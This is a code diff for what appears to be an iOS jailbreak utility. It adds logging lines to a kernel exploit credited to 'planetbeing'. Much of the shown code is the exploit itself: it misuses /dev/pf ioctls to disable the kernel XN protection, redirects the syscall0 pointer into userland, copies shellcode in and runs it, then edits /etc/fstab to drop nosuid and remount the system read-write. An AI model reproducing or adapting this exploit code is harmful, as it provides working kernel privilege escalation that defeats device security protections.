@@ -139,6 +139,7 @@ int main(int argc, char* argv[])
 {
     // -- begin planetbeing's code
     // Offline calculations
+    printf("Offline calculations\n");
     uintptr_t userland_start = 0x1F000000;
     int shift_byte = (KERNEL_SYSCALL0_VALUE >> 24) - (userland_start >> 24);
     uintptr_t shift_address = shift_byte << 24;
@@ -148,6 +149,7 @@ int main(int argc, char* argv[])
     int kernel_code_size_page = (page_offset + kernel_code_size + 0xFFF)  / 0x1000 * 0x1000;
     
     // Setup kernel exploit structs
+    printf("Setup kernel exploit structs\n");
     struct pfioc_trans trans;
     struct pfioc_trans_e trans_e;
     struct pfioc_pooladdr pp;
@@ -160,6 +162,7 @@ int main(int argc, char* argv[])
     trans_e.rs_num = PF_RULESET_FILTER;
     
     // Exploit kernel
+    printf("Exploit kernel\n");
     int pffd = open("/dev/pf", O_RDWR);
     ioctl(pffd, DIOCSTOP);
     ioctl(pffd, DIOCSTART);
@@ -169,10 +172,12 @@ int main(int argc, char* argv[])
     pp.af = AF_INET;
     pp.addr.addr.type = PF_ADDR_TABLE;
     
-    // Disable XN bit for subsequent vm_allocates.
+    // Disable XN bit for subsequent vm_allocates
+    printf("Disable XN bit for subsequent vm_allocates\n");
     decrement_address(pffd, &pp, KERNEL_NX_ENABLE, 1);
     
     // Shift function pointer for syscall0 down into the userland
+    printf("Shift function pointer for syscall0 down into the userland\n");
     decrement_address(pffd, &pp, KERNEL_SYSCALL0 + 3, shift_byte);
     
     ioctl(pffd, DIOCBEGINADDRS, &pp);
@@ -180,30 +185,32 @@ int main(int argc, char* argv[])
     close(pffd);
 
     // Allocate shellcode
+    printf("Allocate shellcode\n");
     vm_address_t allocation = target;
     kern_return_t kr = vm_allocate(mach_task_self(), &allocation, kernel_code_size_page, FALSE);
     if(kr != KERN_SUCCESS)
         return 0;
     
     // Copy shellcode
+    printf("Copy shellcode\n");
     memcpy((void*)(allocation + page_offset), &kernel_code_start, kernel_code_size);
     sys_cache_control(kCacheFunctionPrepareForExecution, (void*)allocation, kernel_code_size_page);
     
     // Execute shellcode
+    printf("Execute shellcode\n");
     syscall(0, 0, 0);
 
     // end planetbeing's code
-    
-    printf("done patching kernel\n");
+    printf("Done patching kernel\n");
     
     struct stat buf;
     
     if(stat("/private/var/unthreadedjb/install", &buf) != -1) {
         return 0;
     }
-    
+
     drawImage("/private/var/unthreadedjb/unthread.png");
-    
+
     NSString *string = [NSString stringWithContentsOfFile:@"/etc/fstab" encoding:NSUTF8StringEncoding error:NULL];
     string = [string stringByReplacingOccurrencesOfString:@",nosuid,nodev" withString:@""];
     string = [string stringByReplacingOccurrencesOfString:@" ro " withString:@" rw "];
